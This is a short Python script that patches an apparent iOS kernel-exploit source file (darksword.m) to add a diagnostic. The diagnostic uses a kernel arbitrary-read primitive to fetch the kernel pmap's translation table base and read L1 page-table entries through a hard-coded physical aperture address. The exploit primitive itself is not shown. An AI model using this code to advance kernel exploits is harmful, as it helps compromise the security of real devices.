filepath = r'C:\Users\smolk\Documents\2\lara-main\jbdc\kexploit\darksword.m'
with open(filepath, 'r', encoding='utf-8') as f:
    content = f.read()

# After reading L1 table VA, also try reading from physical aperture
old_diag = (
    "    // Diagnostic: read first 4 L1 entries to verify table is accessible\n"
    "    for (int di = 0; di < 4; di++) {\n"
    "        uint64_t diag_entry = ds_kread64(l1_table_va + di * 8);\n"
    "        pe_log(\"ds_kvtophys: L1[%d] @ 0x%llx = 0x%llx\", di, l1_table_va + di * 8, diag_entry);\n"
    "    }"
)

new_diag = (
    "    // Diagnostic: read first 4 L1 entries to verify table is accessible\n"
    "    for (int di = 0; di < 4; di++) {\n"
    "        uint64_t diag_entry = ds_kread64(l1_table_va + di * 8);\n"
    "        pe_log(\"ds_kvtophys: L1[%d] @ 0x%llx = 0x%llx\", di, l1_table_va + di * 8, diag_entry);\n"
    "    }\n"
    "\n"
    "    // Also try reading L1 table via physical aperture\n"
    "    // ttep is physical address of L1 table, phys_to_virt maps phys -> kernel VA\n"
    "    // Physical aperture base = 0xffffffe000000000\n"
    "    uint64_t l1_phys = ds_kread64(g_kernel_pmap + 0x08);  // ttep\n"
    "    uint64_t l1_phys_va = 0xffffffe000000000ULL + l1_phys;\n"
    "    for (int di = 0; di < 4; di++) {\n"
    "        uint64_t diag_entry = ds_kread64(l1_phys_va + di * 8);\n"
    "        pe_log(\"ds_kvtophys: L1_phys[%d] @ 0x%llx = 0x%llx\", di, l1_phys_va + di * 8, diag_entry);\n"
    "    }"
)

if old_diag in content:
    result = content.replace(old_diag, new_diag)
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(result)
    print('Added physical aperture L1 table diagnostic')
else:
    print('ERROR: Pattern not found')
    idx = content.find('// Diagnostic: read first 4 L1 entries')
    if idx >= 0:
        print('Found at index', idx)
        print(repr(content[idx:idx+100]))
